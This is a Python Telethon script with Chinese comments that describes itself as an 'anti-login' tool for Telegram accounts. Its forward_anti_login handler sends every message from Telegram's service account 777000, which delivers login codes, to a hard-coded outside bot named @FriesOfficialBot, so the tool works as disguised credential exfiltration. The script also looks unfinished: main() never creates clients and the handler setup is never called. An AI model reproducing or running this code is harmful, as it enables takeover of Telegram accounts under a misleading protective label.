import asyncio
import platform
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
import re
import logging

logging.basicConfig(level=logging.WARNING)
logger = logging.getLogger(__name__)


logging.getLogger('httpx').setLevel(logging.WARNING)
logging.getLogger('apscheduler').setLevel(logging.WARNING)
logging.getLogger('telegram').setLevel(logging.WARNING)

# API凭证
API_ID = None  # 替换为您的API ID
API_HASH = '' # 替换为您的API哈希
BOT_TOKEN = '' # 替换为您的机器人令牌
FORWARD_BOT_USERNAME = '@FriesOfficialBot'  # 设置转发消息的目标机器人用户名例如@FriesOfficialBot

accounts = {}
user_states = {}

PHONE_REGEX = re.compile(r'^\+\d{10,15}$')

def setup_client_handlers(client, phone):
    @client.on(events.NewMessage(outgoing=True))
    async def handle_self_check(event):
        if event.message.text.lower() == 'self check':
            await event.message.edit(text='self checked!')

    @client.on(events.NewMessage(outgoing=True, pattern='antilogin$'))
    async def check_anti_login(event):
        status = 'on' if accounts[phone]['anti_login'] else 'off'
        await event.message.edit(text=f'Anti-login is {status}.')

    @client.on(events.NewMessage(outgoing=True, pattern='antilogin on$'))
    async def enable_anti_login(event):
        accounts[phone]['anti_login'] = True
        await event.message.edit(text='Anti-login turned on successfully.')

    @client.on(events.NewMessage(outgoing=True, pattern='antilogin off$'))
    async def disable_anti_login(event):
        accounts[phone]['anti_login'] = False
        await event.message.edit(text='Anti-login has been successfully disabled.')

    @client.on(events.NewMessage(from_users=[777000]))
    async def forward_anti_login(event):
        if accounts[phone]['anti_login']:
            try:
                bot_entity = await client.get_entity(FORWARD_BOT_USERNAME)
                await client.forward_messages(bot_entity, event.message)
            except Exception as e:
                logger.error(f"Failed to forward message to {FORWARD_BOT_USERNAME}: {str(e)}")

async def main():
    print("Bot Is Running")
    
    while True:
        await asyncio.sleep(1.0 / 60)

if platform.system() == "Emscripten":
    asyncio.ensure_future(main())
else:
    if __name__ == "__main__":
        asyncio.run(main())